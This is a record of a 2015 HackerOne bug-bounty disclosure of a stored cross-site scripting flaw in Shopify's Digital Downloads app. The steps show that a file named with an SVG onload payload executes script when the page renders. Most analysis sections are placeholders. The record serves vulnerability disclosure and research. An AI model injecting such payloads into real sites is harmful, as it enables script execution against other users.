# XSS https://delivery.shopifyapps.com/  (Digital Downloads App  in myshopify.com)

## Metadata
- **Source:** HackerOne
- **Report:** 81441 | https://hackerone.com/reports/81441
- **Submitted:** 2015-08-09
- **Reporter:** dz_samir
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
Hello
Installing the Digital Downloads App in *.myshopify.com
1-install the app  https://apps.shopify.com/digital-downloads
2-select product and click Add Digital Attachment 
3-click to upload file and upload file with name <svg onload=alert(1)>
the code  <svg onload=alert(1)> will execute XSS

<span class="file-name"><strong>Success:</strong> <svg onload="alert(1)"/></span>

tested in fi

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello
Installing the Digital Downloads App in *.myshopify.com
1-install the app  https://apps.shopify.com/digital-downloads
2-select product and click Add Digital Attachment 
3-click to upload file and upload file with name <svg onload=alert(1)>
the code  <svg onload=alert(1)> will execute XSS

<span class="file-name"><strong>Success:</strong> <svg onload="alert(1)"/></span>

tested in firefox

Hadji Samir
 

</details>

---
*Analysed by Claude on 2026-05-24*
